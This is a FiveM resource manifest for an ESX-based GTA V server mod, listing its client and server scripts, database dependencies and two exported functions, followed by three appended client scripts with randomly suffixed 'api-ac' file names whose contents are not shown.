fx_version 'adamant'

game 'gta5'

lua54 'yes'

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'locales/pl.lua',
	'client/main.lua',
}

server_script { 
	'@es_extended/locale.lua',
	'@async/async.lua',
	'@oxmysql/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}

exports {
	'GetDecorations',
	'GetCustomPed'
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"